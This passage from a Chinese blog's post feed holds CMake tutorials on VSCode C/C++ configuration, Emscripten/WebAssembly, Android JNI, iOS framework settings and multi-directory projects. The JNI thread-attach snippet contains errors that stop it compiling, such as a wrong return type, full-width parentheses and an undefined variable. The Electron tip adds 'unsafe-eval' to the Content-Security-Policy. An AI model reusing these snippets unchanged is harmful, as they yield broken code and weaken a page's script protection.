Command Palette” 使用组合键 Shift + Command + P 打开 “Command Palette” 可以执行 “Shell command: Install ‘code’ command in PATH” 来安装code指令 code指令把一个空文件夹配置成C/C++工程的基本命令，在完成配置后存在三个文件，目录结构如下 12345----HelloWorld --.vscode --c_cpp_properties.json --tasks.json --launch.json 文件名 作用 英文原文 c_cpp_properties.json 工程配置文件，让这个目录拥有基本的Workspace、Project的能力 (compiler path and IntelliSense settings) tasks.json 编译文件，指定使用哪种目录编译 (build instructions) launch.json 调试文件，指定调试哪个程序，调试前提是编译结果是Debug配置 (debugger settings) 工程配置文件 c_cpp_properties.json打开 “Command Palette” 执行以下任意一个指令来配置基本的Workspace或Project的能力 “C/C++: Edit Configurations (UI)” 可以使用可视化界面配置 “C/C++: Edit Configurations (JSON)” 可以使用JSON文件配置 注意如上篇文章所陈述，工程和编译的概念很模糊，不同平台和语言的定义不完全一致，所以职责划分并不是绝对的 如果采用可视化界面配置，最终生效的还是 “.vscode/c_cpp_properties.json” 文件 1234567891011121314151617181920212223242526272829303132//这个文件是不能加注释的，不然VSCode会报解析失败，这里加注释只是为了讲解&#123; //配置的数组，成员是字典 &quot;configurations&quot;: [ &#123; // 配置名称 &quot;name&quot;: &quot;Mac&quot;, // 头文件目录 （重要） // 1. 当人为引用HelloWorld目录以外的头文件时需要自己新增配置 // 2. 当引用第三方库时需要自己新增配置，例如OpenCV的 $&#123;OpenCV_INCLUDE_DIRS&#125; &quot;includePath&quot;: [ &quot;$&#123;workspaceFolder&#125;/**&quot; ], // 本地变量 &quot;defines&quot;: [], // Mac系统的系统库 &quot;macFrameworkPath&quot;: [ &quot;/Applications/Xcode.app/Contents/Developer/Platforms/MacOSX.platform/Developer/SDKs/MacOSX10.14.sdk/System/Library/Frameworks&quot; ], // 编译器的路径 &quot;compilerPath&quot;: &quot;/usr/bin/clang&quot;, // 编译器的C语言版本 （重要） &quot;cStandard&quot;: &quot;c11&quot;, // 编译器的C++版本 （重要） &quot;cppStandard&quot;: &quot;c++17&quot;, // 自动补全和智能提示使用哪个 &quot;intelliSenseMode&quot;: &quot;clang-x64&quot; &#125; ], //c_cpp_properties 配置的版本 &quot;version&quot;: 4&#125; 编译任务文件 tasks.json打开 “Command Palette” 执行 “Tasks: Configure Default Build Task” 然后选择“Create tasks.json file from template —— Others” 来配置默认的编译任务 “.vscode/tasks.json” 编译的配置就没有UI界面了（怀疑是懒得做），为了体现VSCode的高自由度（对新人不友好） 这里举例了官方文档的配置示例、CMake的HelloWorld、模仿CLion指令三种配置，说明了不同指令之间的关系 命令 作用 参考配置 clang 编译文件，最基本的指令 官方的配置示例 cmake &amp; make cmake完成配置，make进行调度clang CMake的HelloWorld clang cmake进行配置，cmake调用make使用clang进行编译 CLion 其中CLion的作法才是比较成熟的作法，这里仅仅是举例整个演进的过程 官方配置示例（不重要）官方配置是使用最基本的clang指令，完成文件编译 12345678910111213141516171819202122232425262728293031//这个文件是不能加注释的，不然VSCode会报解析失败，这里加注释只是为了讲解&#123; &quot;version&quot;: &quot;2.0.0&quot;, &quot;tasks&quot;: [ &#123; // 任务名称 &quot;label&quot;: &quot;Build with Clang&quot;, // 任务是一个Shell命令 &quot;type&quot;: &quot;shell&quot;, // 使用 clang++ 命令 &quot;command&quot;: &quot;clang++&quot;, // 对命令传入的参数 “clang++ -std=c++17 ....” &quot;args&quot;: [ &quot;-std=c++17&quot;, &quot;-stdlib=libc++&quot;, &quot;main.cpp&quot;, &quot;-o&quot;, &quot;main&quot;, &quot;--debug&quot; ], // 设置这个任务是默认的任务，可以被快捷键直接启动 &quot;group&quot;: &#123; &quot;kind&quot;: &quot;build&quot;, &quot;isDefault&quot;: true &#125; &#125;, //此处可以添加别的Task .... ]&#125; CMake和Make指令分别使用 （不重要）当文件结构足够多以及目录结构十分复杂的情况的时候，使用一条clang编译指令的参数就过于复杂 可以使用make文件来调度clang，可以参考 CMake配置完成后的 CMakeFiles/HelloWorld.dir/build.make 文件 12345678910&#123; // 任务名称 &quot;label&quot;: &quot;Build with CMake &amp; Make&quot;, // 任务是一个Shell命令 &quot;type&quot;: &quot;shell&quot;, // 1. 使用 cmake 进行配置 // 2. 使用 make 指令进行编译 &quot;command&quot;: &quot;cmake . &amp;&amp; make&quot;, &quot;args&quot;: [ ]&#125; 文件中使用的指令是 XcodeDefault.xctoolchain/usr/bin/c++ ，使用man之后可以看到是clang的一个别名指令 1234CMakeFiles/HelloWorld.dir/main.cpp.o: ../main.cpp ....... /Applications/Xcode.app/Contents/Developer/Toolchains/XcodeDefault.xctoolchain/usr/bin/c++ ..... ...... CLion的CMake流程（成熟工程的作法）由于CMake本身就是对make的包装，那么可以把make指令本身也对大家隐藏起来，只使用cmake 例如CLion 就是仅使用 cmake 组织工程，可以分为配置和编译两步 配置过程在 New Project的过程中已经完成，我们没有抓到日志但是可以模拟出来 123456789101112&#123; // 任务名称 &quot;label&quot;: &quot;Configure with CLion CMake&quot;, // 任务是一个Shell命令 &quot;type&quot;: &quot;shell&quot;, // 模拟 CLion 新建工程文件 // 1. 创建 cmake-build-debug 用于存放CMake的临时文件 // 2. 切换到 cmake-build-debug // 3. 使用 cmake 指令配置 CMakeLists.txt 所在目录 &quot;command&quot;: &quot;mkdir \\&quot;$&#123;workspaceFolder&#125;/cmake-build-debug\\&quot; || cd \\&quot;$&#123;workspaceFolder&#125;/cmake-build-debug\\&quot; &amp;&amp; cmake ../.&quot;, &quot;args&quot;: [ ]&#125; 而在编译阶段可以看到编译指令 1&quot;~&#x2F;Library&#x2F;Application Support&#x2F;JetBrains&#x2F;Toolbox&#x2F;apps&#x2F;CLion&#x2F;ch-0&#x2F;192.6262.62&#x2F;CLion.app&#x2F;Contents&#x2F;bin&#x2F;cmake&#x2F;mac&#x2F;bin&#x2F;cmake&quot; --build ~&#x2F;Desktop&#x2F;HelloWorld&#x2F;cmake-build-debug --target main -- -j 2 我们在VSCode中使用Task来模拟，配置如下 1234567891011121314151617181920212223242526&#123; // 任务名称 &quot;label&quot;: &quot;Build with CLion CMake&quot;, // 任务是一个Shell命令 &quot;type&quot;: &quot;shell&quot;, // 模拟 CLion 编译工程目标 // 1. 使用 cmake 指令替代 make 进行编译，底层还是调用的make &quot;command&quot;: &quot;cmake&quot;, // 2. 给 cmake 传入参数 &quot;args&quot;: [ // 3-1. 指定编译配置所在目录 cmake参数 &quot;--build&quot;, // 3-2. 编译配置所在的目录取决于 CLion 生成时指定的目录 &quot;$&#123;workspaceFolder&#125;/cmake-build-debug&quot;, // 4-1. 指定编译目标 cmake参数 &quot;--target&quot;, // 4-2. 编译目标由 CMakeLists.txt 内 add_executable 决定 &quot;main&quot;, // 5-1. 透传参数给底层make &quot;--&quot;, // 5-2. jobs 任务数 make参数 &quot;-j&quot;, // 5-3. 最多并发2个job &quot;2&quot; ]&#125; 调试启动文件 launch.json打开 “Command Palette” 执行 “Debug: Open launch.json” 选择 “C++(GDB/LLDB)” 就是生成文件 “.vscode/launch.json” 可以用来调试采用Debug编译的可执行程序 12345678910111213141516171819202122232425262728293031323334353637383940414243444546//这个文件是不能加注释的，不然VSCode会报解析失败，这里加注释只是为了讲解&#123; // 版本号 &quot;version&quot;: &quot;0.2.0&quot;, &quot;configurations&quot;: [ &#123; // 名称 &quot;name&quot;: &quot;(lldb) Launch&quot;, // 调试类型 cpp debug &quot;type&quot;: &quot;cppdbg&quot;, // 请求分为 launch 和 attach，后者是附着到已经运行的程序上 &quot;request&quot;: &quot;launch&quot;, // 被调试的程序（重要） // 程序所在的位置，根据tasks编译的结果决定 // 如果采用上述的 cmake 和 clion 的指令就会和官方的有区别 &quot;program&quot;: &quot;$&#123;workspaceFolder&#125;/helloworld.out&quot;, // 启动时传入的参数 &quot;args&quot;: [], // 是否在入口的默认启动一个断点 &quot;stopAtEntry&quot;: true, // 工作目录，即 program 的io时的根目录 &quot;cwd&quot;: &quot;$&#123;workspaceFolder&#125;&quot;, // 环境变量 &quot;environment&quot;: [], // 是否启动额外的窗口 &quot;externalConsole&quot;: true, // 微软调试引擎 microsoft/MIEngine 接入的模式 &quot;MIMode&quot;: &quot;lldb&quot;, // 日志输出 &quot;logging&quot;: &#123; &quot;trace&quot;: true, &quot;traceResponse&quot;: true, &quot;engineLogging&quot;: true &#125;, // 调试前重新编译（重要） // 因为调试（Debug）是启动已经编译好（Build Success）的程序 // 如果想类似IDE CLion和Xcode 每次调试改动前都重新编译 // 可以将编译任务放在Launch之前 &quot;preLaunchTask&quot;: &#123; &quot;task&quot;: &quot;echo&quot;, &quot;type&quot;: &quot;&quot; &#125; &#125; ]&#125; 结语在对配置、编译、调试的整个流程熟悉了之后，如果选择 “VSCode + CMake” 进行开发可以总结为以下流程图 12345678910111213141516171819202122232425262728293031323334353637383940414243+--------------------------------------------------------------------------+| || Source Code || |+--------------------------------------------------------------------------++--------------------------------------------------------------------------+| VSCode |+--------------------------------------------------------------------------++------------+ +--------------------------------------------+ +------------+| | | | | || c_cpp_ | | tasks.json | | launch || properties | | | | .json || .json | | | | || | | | | ||------------+ +--------------------------------------------+ +------+-----+ | +--------------------------------------------+ | | | | | CMake | | | | | | +----------------------------------------+ | | | | | | | | | make | | | | | | | | | | +------------------------------+ | | Debug | | | | | | | | | | clang | | | | | | | | | | | | | +------------------------------+ | | | | +----------------------------------------+ | | | | | +--------------------+-----------------------+ | | | v Build | +-------------------+---------------------+ | | | | | Executable(Target) | | | | &lt;--------+ | | +-----------------------------------------+","tags":[{"name":"CMake","slug":"CMake","permalink":"http://yoursite.com/tags/CMake/"},{"name":"IDE","slug":"IDE","permalink":"http://yoursite.com/tags/IDE/"}]},{"title":"CMake后置-如何读懂复杂的文档","date":"2019-12-08T15:00:00.000Z","path":"2019/12/09/CMake09如何读懂复杂文档/","text":"如何读懂复杂的文档CMake的官方文档一直都以晦涩著称，学习曲线比较陡峭，仅有指令的手册没有完善的入门指导 这里补充一些入门提示，帮助新手理解 1234file(GLOB &lt;variable&gt; [LIST_DIRECTORIES true|false] [RELATIVE &lt;path&gt;] [CONFIGURE_DEPENDS] [&lt;globbing-expressions&gt;...]) 符号的含义 符号 含义 示例 Plain Text 命令本身，不能修改和自定义 file、GLOB Brackets () 函数的参数 和所有类C语言一样 Angle Brackets &lt;&gt; 必选参数 &lt;variable&gt; Square Brackets [] 可选参数 [CONFIGURE_DEPENDS] Oring | 多选一的可选项 true|false Variable 用户自定义变量 variable Ellipsis … 变长参数 [&lt;&gt;…] 这些符号规则和Shell的说明文档十分类似，如果有Linux相关经验的人应该不难理解 解析举例根据符号分析，我们可以拆分解析指令 file是指令本身 第一个固定参数 GLOB 代表Action 第二个参数代表传入一个变量用于储存结果 第三、四个参数一起作为可选输入参数，参数名 LIST_DIRECTORIES 参数值 true 或 false 第五、六个参数一起作为可选输入参数，但是如果第四个存在，则第五个必须存在，参数名 RELATIVE 参数值为一个路径 第七个参数参数为可选参数，本身不附带输入，为标记位，参数名 CONFIGURE_DEPENDS 其八个参数为可选参数，该参数为变长参数，且必须使用 globbing-expressions 12345678# file : 固定命令# GLOB : 固定一个参数# CPP_FILES : 第二个参数# 3 - 7 个参数均被省略# ..../*.cpp : 第八个参数file(GLOB CPP_FILES $&#123;CMAKE_CURRENT_LIST_DIR&#125;/source/*.cpp)","tags":[{"name":"CMake","slug":"CMake","permalink":"http://yoursite.com/tags/CMake/"}]},{"title":"CMake08-跨平台编译WebAssembly实践细节","date":"2019-12-08T11:00:00.000Z","path":"2019/12/08/CMake08跨平台编译WebAssembly细节/","text":"WebAssembly实践细节编译成WebAssembly需要使用Emscripten作为编译器，官方网站为emscripten.org 推荐实践路线 application: 推荐手动建立工程，给出sdk文件位置 sdk: 使用cmake生成，编译完成后拷贝至application应用文件夹 c++: 使用cmake管理，并通过sdk层引用 下载emsdk官方文档Emscripten Toolchain Requirements指出Emscripten依赖的库包括 Node.js、Python、Java、Git client、LLVM、Binaryen 你可以手动安装这些库，但是更加推荐的用法是根据官方文档Download and install直接下载SDK，其内部包含完整的工具链。 emsdk使用CMake如果想让CMake使用emcc命令作为Compiler和LinkTool, 需要使用官方提供的工具链文件Emscripten.cmake 123456# To use this toolchain file with CMake, invoke CMake with the following command line parameters# cmake -DCMAKE_TOOLCHAIN_FILE=&lt;EmscriptenRoot&gt;/cmake/Modules/Platform/Emscripten.cmake# -DCMAKE_BUILD_TYPE=&lt;Debug|RelWithDebInfo|Release|MinSizeRel&gt;# -G &quot;Unix Makefiles&quot; (Linux and OSX)# -G &quot;MinGW Makefiles&quot; (Windows)# &lt;path/to/CMakeLists.txt&gt; # Note, pass in here ONLY the path to the file, not the filename &#x27;CMakeLists.txt&#x27; itself. 根据官方文档提示，只需要在cmake generate的过程中指定CMAKE_TOOLCHAIN_FILE即可 映射C++方法的方式映射C++的方式分为两种 Embind 和 WebIDL Binder，参考博客使用WebAssembly编译C++到JS更加推荐 Embind的方式因为其丰富的数据结构映射 C++ type JavaScript type void undefined bool true or false char Number signed char Number unsigned char Number short Number unsigned short Number int Number unsigned int Number long Number unsigned long Number float Number double Number std::string ArrayBuffer, Uint8Array, Uint8ClampedArray, Int8Array, or String std::wstring String (UTF-16 code units) emscripten::val anything 其中最重要的是 emscripten::val 可以映射任何东西 自然也包括了std::function，可以将C++的lambda转化为js的callback, 详见StackOverflow的回答 编译同步版本根据官方文档Building to WebAssembly的章节 .wasm files and compilation 提出 WebAssembly默认编译结果是异步加载 可以在onRuntimeInitialized中确定何时加载完毕 加载完毕后才能访问C++代码 12Another noticeable effect is that WebAssembly is compiled asynchronously by default, which means you must wait for compilation to complete before calling compiled code (by waiting for main(), or the onRuntimeInitialized callback......) 如果想要同步加载C++ Port的结果，可以选择在编译时设置 WASM_ASYNC_COMPILATION=0 需要注意的是这个参数并没有在编译配置的源代码中出现，应该是文档不够严谨导致的 常见的错误 CMake中 target_compile_options 和 COMPILE_FLAGS 无效 在编译WebAssembly的过程中使用 –bind 参数无法通过以下两个CMake指令传入 target_compile_options set_target_properties(&lt;target&gt; PROPERTIES COMPILE_FLAGS “–bind”) 而只能使用对应Link属性，可以通过 cmake –build path –verbose 查看调用的指令区别 具体原因不详，猜测和Emscripten的Compiler与Link为同一个指令相关 Electron报错unsafe-eval 因为Electron内部的Content-Security-Policy的安全策略问题，使用WASM可能会报错 1&#x27;unsafe-eval&#x27; is required because of a Chrome bug(?) that disallows loading WASM from &#x27;self&#x27;. 参考开源工程electron-wasm-rust-example修改策略 123456&lt;!-- https://github.com/anderejd/electron-wasm-rust-example/issues/6 https://github.com/WebAssembly/content-security-policy/issues/7 https://bugs.chromium.org/p/chromium/issues/detail?id=948834&amp;can=1&amp;q=wasm-eval--&gt;&lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;script-src &#x27;self&#x27; app: &#x27;unsafe-eval&#x27;; object-src &#x27;self&#x27; app:;&quot;&gt;","tags":[{"name":"CMake","slug":"CMake","permalink":"http://yoursite.com/tags/CMake/"}]},{"title":"CMake08-跨平台编译Android实践细节","date":"2019-12-08T06:00:00.000Z","path":"2019/12/08/CMake08跨平台编译Android细节/","text":"Android平台实践细节推荐实践路线 application: 推荐手动建立工程，方便团队里Android工程师使用 sdk: 手工创建工程，并通过build.gradle引用cmake，方便application工程师开箱即用 c++: 使用cmake管理，并通sdk层的CMakeLists.txt引用 Java怎么创建库ModuleAndroid平台的Wrapper与通过CMake generate 出来的Xcode不同，需要自己手工建立 最重要的逻辑区别在于AndroidStudio自己调用CMakeLists.txt本身，过程分为 创建空的Activity，增加 AndroidLibrary Module 对AndroidLibrary 添加CMake的配置文件 下载AndroidStudio读取C++必须的工具NDK、Ninjia 上述步骤可以按照Google官方文档的指导方案配置 Android配置中常见错误 现象：提示无Ninjia 1CMake was unable to find a build program corresponding to &quot;Ninja&quot;. CMAKE_MAKE_PROGRAM is not set. 解决方案：通过Homebrew 或者 AndroidStudio安装Ninjia工具，Ninjia是一个Google的编译工具 现象：Sync不成功，提示找不到SDK 123ERROR: Unable to resolve dependency for &#39;:app@debug&#x2F;compileClasspath&#39;: Failed to transform artifact &#39;sdk.aar (project :sdk)&#39; to match attributes &#123;artifactType&#x3D;jar&#125;.Show DetailsAffected Modules: app 解决方案： App使用了错误的build.gradle setting.gradle应该加载正确的工程路径 1234include &#39;:app&#39;, &#39;:sdk&#39;rootProject.name&#x3D;&#39;Render&#39;project(&#39;:sdk&#39;).projectDir &#x3D; new File(rootDir.path, &quot;..&#x2F;..&#x2F;wrapper&#x2F;JNI&#x2F;sdk&quot;) build.gradle 需要使用正确的依赖方式 1234dependencies &#123; ...... implementation project(path: &#39;:sdk&#39;)&#125; 现象：AndroidStudio未能加载CPP文件 解决方案：在安装Ninjia之后，点击”Build-Refresh Link C++ Project” JNI中的Env问题JNI接口中有一个最重要的概念是JNIEnv，作为每一个方法的第一个参数代表着Java环境的全部上下文 根据JNI官方文档原文指出 每一次Java虚拟机调用JNI接口，保证同一个线程传入同一个地址的JNIEnv 1Native methods receive the JNI interface pointer as an argument. The VM is guaranteed to pass the same interface pointer to a native method when it makes multiple calls to the native method from the same Java thread. JNIEnv和线程强相关，不能够在一个线程访问另一个线程的JNIEnv 1The JNI interface pointer is only valid in the current thread. A native method, therefore, must not pass the interface pointer from one thread to another. 根据以上描述，如果开发者选择在C++开启一个线程，并且使用lambda进行回调的话，则需要注意 两个Scope中的JNIEnv并不一致 一般使用静态Map，以线程ID为Key值储存JNIEnv的指针 C++线程需要手动Attach到Java虚拟机上 12345678910111213141516171819202122232425262728293031323334//保留Java虚拟机static JavaVM *java_vm = nullptr;//创建容器static std::unordered_map&lt;std::thread::id, JNIEnv *&gt; jni_env_map;//在C++线程中获取线程Env并执行Attachvoid* JNI_AttachCppThread() &#123; JNIEnv *env; if (java_vm-&gt;GetEnv(reinterpret_cast&lt;void**&gt;(&amp;env), JNI_VERSION_1_6) != JNI_OK) &#123; return JNI_ERR; &#125; if （java_vm-&gt;AttachCurrentThread(&amp;env, NULL) != JNI_OK） &#123; return JNI_ERR; &#125; jni_env_map[std::this_thread::get_id()] = env;&#125;//切换ENVvoid JNI_method(JNIEnv *env, jobject thiz) &#123; //Java方法调用 auto java_thread_id = std::this_thread::get_id(); auto java_env = jni_env_map.at(thread_id) if (env == java_env) &#123; std::cout &lt;&lt; &quot;Some JNIEnv * passed by JavaVM&quot; &lt;&lt; std::endl; &#125; //进入C++方法 cpp::method_with_callback([]() &#123; //通过C++线程获得Env //此处如果访问java_env则会造成JavaVM Crash auto cpp_thread_id = std::this_thread::get_id(); auto cpp_env = jni_env_map.at(thread_id) &#125;);&#125;","tags":[{"name":"CMake","slug":"CMake","permalink":"http://yoursite.com/tags/CMake/"}]},{"title":"CMake08-跨平台编译iOS实践细节","date":"2019-12-08T03:00:00.000Z","path":"2019/12/08/CMake08跨平台编译iOS细节/","text":"iOS平台实践细节推荐实践路线 application: 推荐手动建立工程，方便团队里iOS工程师使用 sdk: 使用cmake生成，并设置成同手动工程配置，方便application工程师开箱即用 c++: 使用cmake管理，并通过sdk层引用 iOS的Info.plist如何处理iOS平台上的Product常见一个Info.plist文件用于描述基本信息 CMake提供了两个基本模版 MacOSXFrameworkInfo.plist.in MacOSXBundleInfo.plist.in 并且可以通过设置一些环境变量填入这个模版, 参考官方文档 1234set(MACOSX_FRAMEWORK_IDENTIFIER &quot;demo.alanli&quot;) set(MACOSX_FRAMEWORK_NAME &quot;AlgorithmSDK&quot;) set(MACOSX_FRAMEWORK_BUNDLE_VERSION &quot;1.0.0&quot;) set(MACOSX_FRAMEWORK_SHORT_VERSION_STRING &quot;1.0.0&quot;) 也可以用户模仿官方模版自己指定模版，并且指定路径 12345set_target_properties( .... MACOSX_FRAMEWORK_INFO_PLIST $&#123;CMAKE_CURRENT_LIST_DIR&#125;/Info.plist.in ....) Xcode Generate 生成的工程和手工不一致在使用Xcode Genreate的时候生成的工程有些选项和手工是不一致的，导致不能当成一个正常的Project来用 两个主要的问题 Framework不能进行Archive操作 Dependency和LinkLibrary的关系 解决方案分别是 手工生成的Project的Build Setting - SKIP_INSTALL 是YES， 而CMake生成的是 NO Xcode的Run指令会自动link已经dependency的target，不需要CMake的指令再link一遍，如果不是Xcode Generate则需要CMake进行Link 列出一份基本的配置表，帮助我们可以还原Xcode11 手动创建的工程配置, 更多细节可以参考源代码 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364set_target_properties( AlgorithmSDK PROPERTIES # Make target is framework FRAMEWORK TRUE FRAMEWORK_VERSION C MACOSX_FRAMEWORK_IDENTIFIER $&#123;MACOSX_FRAMEWORK_IDENTIFIER&#125; MACOSX_FRAMEWORK_INFO_PLIST $&#123;CMAKE_CURRENT_LIST_DIR&#125;/Info.plist.in # Mark which headers should public PUBLIC_HEADER $&#123;TARGET_HEADERS&#125; ## ---------------------------------- ## Architecture ## ---------------------------------- XCODE_ATTRIBUTE_ONLY_ACTIVE_ARCH[variant=Debug] &quot;YES&quot; XCODE_ATTRIBUTE_ONLY_ACTIVE_ARCH[variant=Release] &quot;NO&quot; ## ---------------------------------- ## Build Location ## ---------------------------------- XCODE_ATTRIBUTE_SYMROOT &quot;build&quot; ## ---------------------------------- ## Build Option ## ---------------------------------- XCODE_ATTRIBUTE_DEBUG_INFORMATION_FORMAT[variant=Debug] &quot;dwarf&quot; XCODE_ATTRIBUTE_DEBUG_INFORMATION_FORMAT[variant=Release] &quot;dwarf-with-dsym&quot; ## ---------------------------------- ## Deployment ## ---------------------------------- # Enable iPhone,iPad, cmake default is iPhone XCODE_ATTRIBUTE_TARGETED_DEVICE_FAMILY &quot;1,2&quot; # Enable framework can archive, cmake default is NO XCODE_ATTRIBUTE_SKIP_INSTALL &quot;YES&quot; XCODE_ATTRIBUTE_INSTALL_PATH &quot;$(LOCAL_LIBRARY_DIR)/Frameworks&quot; ## ---------------------------------- ## Link ## ---------------------------------- XCODE_ATTRIBUTE_DYLIB_INSTALL_NAME_BASE &quot;@rpath&quot; XCODE_ATTRIBUTE_LD_DYLIB_INSTALL_NAME &quot;$(DYLIB_INSTALL_NAME_BASE:standardizepath)/$(EXECUTABLE_PATH)&quot; XCODE_ATTRIBUTE_LD_RUNPATH_SEARCH_PATHS &quot;$(inherited) @executable_path/Frameworks @loader_path/Frameworks&quot; XCODE_ATTRIBUTE_DYLIB_COMPATIBILITY_VERSION &quot;1&quot; XCODE_ATTRIBUTE_DYLIB_CURRENT_VERSION &quot;1&quot; ## ---------------------------------- ## Packaging ## ---------------------------------- XCODE_ATTRIBUTE_PRODUCT_BUNDLE_IDENTIFIER $&#123;MACOSX_FRAMEWORK_IDENTIFIER&#125; ## ---------------------------------- ## Apple Clang - Language - C++ ## ---------------------------------- XCODE_ATTRIBUTE_CLANG_CXX_LANGUAGE_STANDARD &quot;gnu++14&quot; XCODE_ATTRIBUTE_CLANG_CXX_LIBRARY &quot;libc++&quot; ## ---------------------------------- ## Apple Clang - Language - Modules ## ---------------------------------- XCODE_ATTRIBUTE_CLANG_ENABLE_MODULES &quot;YES&quot; ## ---------------------------------- ## Apple Clang - Language - Objective-C ## ---------------------------------- # Enable ARC, cmake default is MRC XCODE_ATTRIBUTE_CLANG_ENABLE_OBJC_ARC &quot;YES&quot; XCODE_ATTRIBUTE_CLANG_ENABLE_OBJC_WEAK &quot;YES&quot; ## ---------------------------------- ## Apple Clang - Language - Code Generation ## ---------------------------------- XCODE_ATTRIBUTE_GCC_GENERATE_DEBUGGING_SYMBOLS &quot;YES&quot;) 默认是MAC 要设置成iOS 已知的错误实践由于CMake可以使用Xcode作为Generator，所以大部分开发者会有生成一个TestApp的想法，及通过 1add_executable(test_app $&#123;Headers&#125; $&#123;Sources&#125;) 虽然CMake支持这个功能，但是对于一些细节问题处理的不够好，有三个问题会依次出现 通过 cmake –build . 指令编译失败 签名问题比较复杂，如果多团队使用不同的证书，通用性比较差 无法生成Asset.xcassets 文件，可以通过Resource管理图片，不方便不懂CMake的开发队友 解决这三个问题引入的方法复杂度远高于三个问题本身，所以不推荐使用CMake生成测试用App，尽量采用示例代码的结构 签名问题根据CMake文档FRAMEWORK的示例代码 1234set_target_properties(dynamicFramework PROPERTIES ........ XCODE_ATTRIBUTE_CODE_SIGN_IDENTITY &quot;iPhone Developer&quot;) 使用”iPhone Developer”的原因是因为Xcode会自动寻找合适的证书，如果不使用这种通用字符串，可以指定具体的签名文件 根据经验推荐以下两点 如果你有App需要源码依赖Framework，不推荐对Framework进行签名，而统一交给App进行签名 如果发布的Release产品就是一个Framework必须签名，推荐使用 “iPhone Distribution”，并设置CMAKE_XCODE_ATTRIBUTE_DEVELOPMENT_TEAM Swift启用如果想启用Swift需要使用的CMake指令 12# 注意要在写add_library add_execute 之前enable_language(Swift) 并且Swift因为更新的原因常常会找不到Compiler，需要更新至最新CMake，例如No CMAKE_Swift_COMPILER could be found","tags":[{"name":"CMake","slug":"CMake","permalink":"http://yoursite.com/tags/CMake/"}]},{"title":"CMake08-跨平台编译最佳实践细节","date":"2019-12-07T15:00:00.000Z","path":"2019/12/08/CMake08跨平台编译最佳实践/","text":"目标CMake最大的作用之一就是整合各个平台的工具链来管理共享的代码 本文根据实际工作给出一份最佳实践源代码cmake-tutorial-sample，所要达成的目标 一个可以共享的C++算法库 代码逻辑可以应用于 Mobile、Desktop、Web 三种环境 一份对应平台的中间层SDK Wrapper 在真正的团队合作中，还需要补充的最重要的两点 不给业务开发者带来额外的负担，因为不同平台业务开发者可能不了解cmake运作机制 中间层SDK可以通过IDE进行源代码引用提供调试能力，因为SDK的UnitTest无法达到100%覆盖，方便出现问题时定位原因位于业务层还是SDK层 基本的目录结构包括 123456#根目录--root --application #可以运行的App，包含iOS、Android、Electron、Web --cmake #使用cmake编译的库，包含共享的C++库、iOS的framework、Android的aar，WebAssembly的wasm --wrapper #中间层工程，包含cmake生成的Xcode工程、WebAssembly的Make工程，手工建立的Android中间层 路线根据不同的平台提供不同的Target，并且产生Wrapper工程的方式不同 平台 Target Project iOS Framework 使用cmake -G “Xcode” 产生 Android AndroidLibrary 需要通过AndroidStudio建立配置gradle引用CMakeLists.txt Desktop &amp; Web WebAssembly 使用 cmake -DCMAKE_TOOLCHAIN_FILE=”file” 产生 已知的关键点不同的平台细节上会有一些需要注意的地方，大致包含以下几个方面，会在后续的文章中进行详解 平台 关键点 iOS 1. App签名问题问题的细节2. 使用cmake -G “Xcode” 生成等同手工创建的工程3. 使用模板处理info.plist Android 1. 安装前置工具 Ninjia、NDK、CMake2. 手动创建JNI中间层的工程3. JNI中间层如何连接C++源码 WebAssembly 1. 下载emsdk编译器工具2. CMake编译时设置工具链3. CMake无法设置CompilerFlag4. 编译成同步和异步版本","tags":[{"name":"CMake","slug":"CMake","permalink":"http://yoursite.com/tags/CMake/"}]},{"title":"CMake07-如何多工程协作","date":"2019-12-06T15:00:00.000Z","path":"2019/12/07/CMake07多工程协作/","text":"工作台的问题在编译的基本概念里有提到一个管理器空间，iOS叫Workspace，Android叫Project CMake本身使用Directory作为管理器空间的组织者，通过SubDirectory来组织不同的CMake项目 子目录123456789——root ——build ——main ——CMakeLists.txt ——hello ——CMakeLists.txt ——world ——CMakeLists.txt ——CMakeLists.txt 目录helloworld - CMakeLists.txt“helloworld”这个顶级文件夹作为协调不同工程的工作空间 1234567891011# 指定CMake最小版本cmake_minimum_required(VERSION 3.14)# 该工程为Workspace，不包含任何 target，仅起协调作用project(HelloWorld)# 内部协调的工程分别位于文件夹 hello、world、mainadd_subdirectory($&#123;CMAKE_CURRENT_LIST_DIR&#125;/hello)add_subdirectory($&#123;CMAKE_CURRENT_LIST_DIR&#125;/world)add_subdirectory($&#123;CMAKE_CURRENT_LIST_DIR&#125;/main) 目录main - CMakeLists.txt“main”工程为主程序，其依赖两个子工程分别是 hello 和 world 123456789101112131415161718192021222324252627282930313233# 指定CMake最小版本cmake_minimum_required(VERSION 3.14)# hello_world内包含一个可执行文件的target# target 的名称为 main# 对比：# iOS的习惯里 一般project名和target同名# Android的习惯里 module名下可以有多个package名add_executable(main main.cpp)# 依赖关系为 main 依赖 hello、world两个项目产生的库add_dependencies( main # 名称来自 main - CMakeLists.txt 的 add_executable hello # 名称来自 hello - CMakeLists.txt 的 add_library world # 名称来自 world - CMakeLists.txt 的 add_library )# 给main target添加头文件目录# 帮助我们寻找头文件 #include&lt;.h&gt;# CMAKE_SOURCE_DIR 指的是顶级目录 helloworldtarget_include_directories( main PUBLIC $&#123;CMAKE_SOURCE_DIR&#125;/hello PUBLIC $&#123;CMAKE_SOURCE_DIR&#125;/world)# 给main target添加依赖库# 帮助调用库中的函数target_link_libraries( main hello world) 目录依赖库 - CMakeLists.txt其中 “hello” 和 “world” 均为我们的依赖库，使用的CMakeLists.txt文件主体结构十分类似 123456# 指定CMake最小版本cmake_minimum_required(VERSION 3.14)# 一个静态库的target 名称为 hello# 经过workspace协调后可以被main引用add_library(hello hello.cpp) 更多的源代码可以参考CMake07的源代码 目录并不在文件系统子目录内在当前的举例中 hello 和 world 都在文件系统内实际为子目录，如果存在不为文件系统子目录的情况, 根据文档描述 1If binary_dir is not specified, the value of source_dir, before expanding any relative path, will be used (the typical usage). 所以如果我们想使用相对路径的 source_dir，可以通过以下方式指定 binary_dir 1234# 相当于 add_subdirectory($&#123;CMAKE_CURRENT_LIST_DIR&#125;/hello $&#123;CMAKE_CURRENT_BINARY_DIR&#125;/hello)add_subdirectory($&#123;CMAKE_CURRENT_LIST_DIR&#125;/hello)# 参数1不为实际的子目录，只需要指定 BINARY_DIR 即可add_subdirectory($&#123;CMAKE_CURRENT_LIST_DIR&#125;/../outside/world 